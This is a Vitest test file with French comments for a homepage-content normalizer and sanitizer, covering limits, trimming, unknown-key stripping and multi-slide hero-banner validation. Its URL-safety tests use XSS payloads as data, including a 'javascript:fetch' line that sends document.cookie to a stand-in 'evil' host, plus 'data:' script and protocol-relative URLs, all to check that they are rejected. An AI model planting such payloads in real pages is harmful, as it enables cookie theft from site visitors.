import { describe, expect, it } from 'vitest';
import {
  EMPTY_HOME_CONTENT,
  MAX_HERO_SLIDES,
  heroSlidesEffectives,
  normalizeHomeContent,
  sanitizeHomeContentInput,
} from './home-content';
import { BandeauAccueilValide, raisonDeRefusDuBandeau } from './dto/hero-slides.validator';
import { EXEMPLE_HOME_CONTENT } from './home-seed-exemple';

describe('home-content — normalizeHomeContent', () => {
  it('renvoie une forme COMPLÈTE et vide pour null/undefined', () => {
    expect(normalizeHomeContent(null)).toEqual(EMPTY_HOME_CONTENT);
    expect(normalizeHomeContent(undefined)).toEqual(EMPTY_HOME_CONTENT);
    // Toujours les tableaux (jamais undefined) — le gabarit peut mapper sans garde.
    const n = normalizeHomeContent({});
    expect(Array.isArray(n.stats)).toBe(true);
    expect(Array.isArray(n.espaces)).toBe(true);
    expect(Array.isArray(n.hours.lines)).toBe(true);
  });

  it('borne les statistiques à 4 (spec §2)', () => {
    const content = normalizeHomeContent({
      stats: Array.from({ length: 9 }, (_, i) => ({ value: `${i}`, label: `l${i}` })),
    });
    expect(content.stats).toHaveLength(4);
  });

  it('valide le statut des ressources (valeur inconnue → live)', () => {
    const content = normalizeHomeContent({
      resources: [
        { name: 'A', status: 'maint', statusLabel: 'X' },
        { name: 'B', status: 'n’importe quoi', statusLabel: 'Y' },
      ],
    });
    expect(content.resources[0].status).toBe('maint');
    expect(content.resources[1].status).toBe('live');
  });

  it('trim les chaînes et coerce les types inattendus en vide', () => {
    const content = normalizeHomeContent({
      identity: { fullName: '  BUC  ', acronym: 42, lead: null },
      services: ['  Accueil  ', '', 123, 'Prêt'],
    });
    expect(content.identity.fullName).toBe('BUC');
    expect(content.identity.acronym).toBe(''); // nombre → vide
    expect(content.identity.lead).toBe('');
    // Les entrées vides / non-chaîne sont écartées de la liste des services.
    expect(content.services).toEqual(['Accueil', 'Prêt']);
  });

  it('rejette les schémas d’URL dangereux (XSS), garde http/https ET les relatives same-origin', () => {
    const content = normalizeHomeContent({
      identity: {
        logoUrl: 'javascript:alert(document.cookie)',
        heroImageUrl: 'https://cdn.exemple/hero.jpg',
      },
      resources: [
        { name: 'OK', status: 'live', url: 'https://sudoc.fr' },
        { name: 'JS', status: 'live', url: 'javascript:fetch("//evil?c="+document.cookie)' },
        { name: 'DATA', status: 'live', url: 'data:text/html,<script>alert(1)</script>' },
        { name: 'Relative', status: 'live', url: '/api/x' },
        { name: 'ProtoRel', status: 'live', url: '//evil.com' },
      ],
      contact: {
        socials: [
          { label: 'Bon', url: 'http://facebook.com/buc' },
          { label: 'Piégé', url: 'JavaScript:alert(1)' },
        ],
      },
    });
    // logo javascript: → neutralisé (null) ; image https conservée.
    expect(content.identity.logoUrl).toBeNull();
    expect(content.identity.heroImageUrl).toBe('https://cdn.exemple/hero.jpg');
    // Ressources : http/https absolues ET relatives same-origin survivent ;
    // javascript:/data:/protocol-relative rejetés.
    expect(content.resources.map((r) => r.url)).toEqual([
      'https://sudoc.fr',
      '',
      '',
      '/api/x',
      '',
    ]);
    // Réseaux sociaux : casse du schéma ignorée, javascript: rejeté.
    expect(content.contact.socials.map((s) => s.url)).toEqual([
      'http://facebook.com/buc',
      '',
    ]);
  });

  it('safeUrl (via normalizeHomeContent) : cas requis — relative OK, https OK, javascript/proto-relative KO', () => {
    // Logo/photo hero téléversés → URL relatives same-origin (régression 2026-07-16).
    expect(normalizeHomeContent({ identity: { logoUrl: '/api/x' } }).identity.logoUrl).toBe('/api/x');
    expect(
      normalizeHomeContent({ identity: { logoUrl: '/covers/home/zinda/logo.png' } }).identity.logoUrl,
    ).toBe('/covers/home/zinda/logo.png');
    expect(
      normalizeHomeContent({ identity: { heroImageUrl: 'https://x/hero.jpg' } }).identity.heroImageUrl,
    ).toBe('https://x/hero.jpg');
    // Rejets : javascript:, protocol-relative, backslash-host.
    expect(normalizeHomeContent({ identity: { logoUrl: 'javascript:alert(1)' } }).identity.logoUrl).toBeNull();
    expect(normalizeHomeContent({ identity: { logoUrl: '//evil.com' } }).identity.logoUrl).toBeNull();
    expect(normalizeHomeContent({ identity: { logoUrl: '/\\evil.com' } }).identity.logoUrl).toBeNull();
  });
});

describe('home-content — sanitizeHomeContentInput (écriture)', () => {
  it('écarte les clés inconnues (anti-injection JSON)', () => {
    const clean = sanitizeHomeContentInput({
      identity: { fullName: 'BUC', evil: '<script>' },
      // Section inconnue → absente du résultat.
      hackers: [{ x: 1 }],
    }) as unknown as Record<string, unknown>;
    expect((clean.identity as Record<string, unknown>).evil).toBeUndefined();
    expect(clean.hackers).toBeUndefined();
    // Les sections connues restent présentes (forme complète).
    expect(clean.stats).toEqual([]);
  });
});

describe('home-content — seed EXEMPLE', () => {
  it('le contenu EXEMPLE traverse la normalisation sans perte (déjà conforme)', () => {
    // Un aller-retour idempotent : le seed est déjà propre et borné.
    expect(normalizeHomeContent(EXEMPLE_HOME_CONTENT)).toEqual(EXEMPLE_HOME_CONTENT);
    expect(EXEMPLE_HOME_CONTENT.espaces).toHaveLength(7);
    expect(EXEMPLE_HOME_CONTENT.stats).toHaveLength(4);
    expect(EXEMPLE_HOME_CONTENT.services).toHaveLength(5);
  });
});

// ════════════════════════════════════════════════════════════════════════════
// Bandeau d'accueil à plusieurs diapositives (`identity.heroSlides`).
//
// La voie retenue est « lire les deux » : on ne migre RIEN, la base garde ce
// que l'établissement a saisi, et le bandeau d'une école configurée avant ce
// champ est reconstruit à la LECTURE. Cette voie n'a d'intérêt que si elle
// n'écrit rien — d'où le test de garantie plus bas, qui exerce le cas dégradé
// (école historique + enregistrement d'un champ SANS RAPPORT) et non le cas
// nominal.
// ════════════════════════════════════════════════════════════════════════════
describe('home-content — heroSlides : compatibilité ascendante SANS écriture', () => {
  const HISTORIQUE = {
    identity: {
      heroImageUrl: '/covers/hero.jpg',
      heroImageKicker: 'Depuis 1965',
      heroImageCaption: 'La salle de lecture',
    },
  };

  it('une école historique voit son bandeau reconstruit, en correspondance LITTÉRALE', () => {
    const { identity } = normalizeHomeContent(HISTORIQUE);
    expect(heroSlidesEffectives(identity)).toEqual([
      {
        imageUrl: '/covers/hero.jpg',
        // caption = le texte mis en avant ; kicker = le SURTITRE. C'est
        // l'inverse du mapping de apps/web/lib/hero-slides.ts, qui appelait le
        // kicker « legende » — abus de langage que ce contrat ne reprend pas.
        titre: 'La salle de lecture',
        surtitre: 'Depuis 1965',
      },
    ]);
  });

  it('⚠ GARANTIE — aucune dérivation ne fuit dans le chemin d’ÉCRITURE', () => {
    // LE test du lot. sanitizeHomeContentInput EST normalizeHomeContent, et
    // l'écriture remplace le blob ENTIER : si la dérivation vivait dans le
    // normaliseur, enregistrer un horaire suffirait à écrire le bandeau
    // reconstruit dans les données du client. Ici on enregistre un champ sans
    // aucun rapport, sur une école historique.
    const ecrit = sanitizeHomeContentInput({
      ...HISTORIQUE,
      hours: { note: 'Fermé le samedi', lines: [] },
    });
    // Ce qui part en base ne contient AUCUNE diapositive…
    expect(ecrit.identity.heroSlides).toEqual([]);
    // …alors que la lecture, elle, en montre bien une.
    expect(heroSlidesEffectives(ecrit.identity)).toHaveLength(1);
    // Et les trois champs historiques sont intacts : rien n'a été migré.
    expect(ecrit.identity.heroImageUrl).toBe('/covers/hero.jpg');
    expect(ecrit.identity.heroImageKicker).toBe('Depuis 1965');
  });

  it('une liste saisie fait foi : les champs historiques ne la complètent jamais', () => {
    const { identity } = normalizeHomeContent({
      identity: {
        ...HISTORIQUE.identity,
        heroSlides: [{ imageUrl: '/covers/a.jpg', titre: 'A', surtitre: 'un' }],
      },
    });
    // L'ancienne image ne réapparaît pas derrière la nouvelle liste.
    expect(heroSlidesEffectives(identity)).toEqual([
      { imageUrl: '/covers/a.jpg', titre: 'A', surtitre: 'un' },
    ]);
  });

  it('sans image et sans liste, il n’y a pas de bandeau du tout', () => {
    const { identity } = normalizeHomeContent({ identity: { heroImageKicker: 'orphelin' } });
    expect(heroSlidesEffectives(identity)).toEqual([]);
  });
});

describe('home-content — heroSlides : la LECTURE tronque, elle ne lève pas', () => {
  it('borne à MAX_HERO_SLIDES un blob déjà en base qui dépasse', () => {
    const trop = Array.from({ length: 7 }, (_, i) => ({
      imageUrl: `/covers/${i}.jpg`,
      titre: `T${i}`,
      surtitre: '',
    }));
    const { identity } = normalizeHomeContent({ identity: { heroSlides: trop } });
    expect(identity.heroSlides).toHaveLength(MAX_HERO_SLIDES);
    // L'ordre est significatif : la première reste la première (celle du mobile).
    expect(identity.heroSlides[0].imageUrl).toBe('/covers/0.jpg');
  });

  it('écarte les diapositives sans image utilisable, y compris les URL dangereuses', () => {
    const { identity } = normalizeHomeContent({
      identity: {
        heroSlides: [
          { imageUrl: 'javascript:alert(1)', titre: 'XSS' },
          { imageUrl: '', titre: 'vide' },
          { imageUrl: '//evil.com/x.jpg', titre: 'proto-relative' },
          { imageUrl: 'https://ok.example/x.jpg', titre: 'bonne' },
        ],
      },
    });
    expect(identity.heroSlides).toEqual([
      { imageUrl: 'https://ok.example/x.jpg', titre: 'bonne', surtitre: '' },
    ]);
  });

  it('⚠ écarte AVANT de borner : une entrée invalide ne coûte pas une diapositive valide', () => {
    // Borner d'abord ne laisserait que 4 diapositives valides sur 5 possibles.
    // C'est l'inverse du piège du bandeau front (une image qui échoue au
    // CHARGEMENT ne doit pas faire glisser l'affichage) : ici on décide ce qui
    // EXISTE, pas ce qu'on montre quand le réseau lâche.
    const liste = [
      { imageUrl: 'javascript:alert(1)', titre: 'invalide' },
      ...Array.from({ length: 5 }, (_, i) => ({ imageUrl: `/covers/${i}.jpg`, titre: `T${i}` })),
    ];
    const { identity } = normalizeHomeContent({ identity: { heroSlides: liste } });
    expect(identity.heroSlides).toHaveLength(MAX_HERO_SLIDES);
    expect(identity.heroSlides.map((d) => d.titre)).toEqual(['T0', 'T1', 'T2', 'T3', 'T4']);
  });
});

describe('home-content — heroSlides : l’ÉCRITURE refuse explicitement', () => {
  const slide = (i: number) => ({ imageUrl: `/covers/${i}.jpg`, titre: `T${i}`, surtitre: '' });

  it('accepte l’absence de bandeau — c’est le cas de toutes les écoles historiques', () => {
    expect(raisonDeRefusDuBandeau({ identity: { heroImageUrl: '/covers/hero.jpg' } })).toBeNull();
    expect(raisonDeRefusDuBandeau({ identity: {} })).toBeNull();
    expect(raisonDeRefusDuBandeau(undefined)).toBeNull();
  });

  it('accepte une liste conforme, jusqu’à la limite incluse', () => {
    const liste = Array.from({ length: MAX_HERO_SLIDES }, (_, i) => slide(i));
    expect(raisonDeRefusDuBandeau({ identity: { heroSlides: liste } })).toBeNull();
  });

  it('refuse au-delà de la limite, en la NOMMANT et en disant ce qui a été reçu', () => {
    const liste = Array.from({ length: 6 }, (_, i) => slide(i));
    const raison = raisonDeRefusDuBandeau({ identity: { heroSlides: liste } });
    expect(raison).toContain(String(MAX_HERO_SLIDES));
    expect(raison).toContain('6');
  });

  it('refuse une diapositive sans image utilisable, en donnant son RANG', () => {
    const raison = raisonDeRefusDuBandeau({
      identity: { heroSlides: [slide(0), { imageUrl: 'javascript:alert(1)', titre: 'x' }] },
    });
    // Rang humain (2), pas l'indice (1) : le message s'adresse à qui saisit.
    expect(raison).toContain('n° 2');
  });

  it('le refus ne garde AUCUN état entre deux appels', () => {
    // class-validator réutilise une seule instance de contrainte : une raison
    // mémorisée fuiterait d'une requête à l'autre sous charge.
    const mauvais = { identity: { heroSlides: Array.from({ length: 9 }, (_, i) => slide(i)) } };
    const bon = { identity: { heroSlides: [slide(0)] } };
    const c = new BandeauAccueilValide();
    expect(c.validate(mauvais)).toBe(false);
    expect(c.validate(bon)).toBe(true);
    expect(c.defaultMessage({ value: bon } as never)).toBe('Bandeau d’accueil invalide.');
  });
});
